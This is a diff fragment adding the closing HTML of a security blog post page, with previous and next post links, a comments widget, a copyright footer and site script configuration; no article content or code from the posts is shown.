+    </div>
+
+    <div class="post-nav"><a href="/posts/webshell-bypass-php/" class="prev" rel="prev" title="[知识星球]WebShell免杀之PHP"><i class="fas fa-angle-left fa-fw"></i>[知识星球]WebShell免杀之PHP</a>
+            <a href="/posts/pluck-cms-getshell/" class="next" rel="next" title="Pluck CMS后台另两处任意代码执行">Pluck CMS后台另两处任意代码执行<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
